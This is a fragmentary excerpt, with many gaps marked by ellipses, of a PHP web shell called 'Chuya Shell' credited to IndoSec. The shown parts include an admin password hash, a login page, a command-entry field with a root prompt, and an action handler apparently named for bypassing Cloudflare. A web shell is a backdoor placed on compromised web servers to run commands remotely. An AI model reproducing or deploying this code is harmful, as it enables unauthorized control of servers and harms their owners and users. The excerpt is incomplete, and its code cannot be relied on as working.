...
/* Configurasi */
$auth_pass 			= "ce26ada11b202b08e3a78b36b26023f9";// admin
$color 				= "#00ff00";
...
<html>
	<head>
		...
		<title>{ Chuya Shell }</title>
		<link rel='icon' type='image/png' href='https://i.top4top.io/p_22401udti0.png'/>
			...
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h1 class="text-center">{ Chuya Shell }</h1>
						<h5 class="text-center pb-5">GA NIKUNG GA ADA DUIT</h5>
						<form method="post">
				...
				</div><a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom">Copyright 2024 CHUYA</a><br/>
			</div>
		</center>
...
.html(filenames.join(","));
		...
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">{ CHUYA }</h1>
			<center><h5>GA NIKUNG GA ADA DUIT</a></h5></center>
			<hr/>
			...
			<div class="row">
				<div class="col-lg-4"><br/>
					...
					<form>
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="root@chuya~#">
					</form>
	...
	*/
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		echo '</table></div><hr/><a href="https://facebook.com/IndoSecOfficial" class="text-muted">Copyright 2024 { CHUYA }</a></center><br/>';	
